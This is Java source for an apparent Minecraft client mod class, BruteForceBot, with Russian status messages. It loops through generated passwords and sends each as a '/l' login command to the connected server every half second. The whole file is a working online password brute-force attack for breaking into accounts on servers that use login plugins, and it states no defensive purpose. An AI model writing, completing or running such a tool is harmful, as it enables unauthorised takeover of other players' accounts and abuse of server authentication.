package net.novabruteforce;

import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.text.Text;

public class BruteForceBot {
    private Thread thread;
    private volatile boolean running = false;
    private final String ip;
    private final String name;
    private final BruteForceScreen screen;
    private PasswordGenerator generator;

    public BruteForceBot(String ip, String name, BruteForceScreen screen) {
        this.ip = ip;
        this.name = name;
        this.screen = screen;
        this.generator = new PasswordGenerator();
    }

    public void start() {
        running = true;
        thread = new Thread(() -> {
            while (running) {
                String password = generator.generate();
                screen.updatePassword(password);
                
                MinecraftClient client = MinecraftClient.getInstance();
                client.execute(() -> {
                    ClientPlayNetworkHandler handler = client.getNetworkHandler();
                    if (handler != null) {
                        handler.sendCommand("l " + password);
                        screen.updateStatus("Попытка: " + password);
                    } else {
                        screen.updateStatus("Не подключён к серверу!");
                        running = false;
                    }
                });

                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                    break;
                }
            }
            screen.updateStatus("Остановлен");
            screen.updatePassword("");
        });
        thread.start();
    }

    public void stop() {
        running = false;
        if (thread != null) {
            thread.interrupt();
        }
    }

    public boolean isRunning() {
        return running;
    }
}
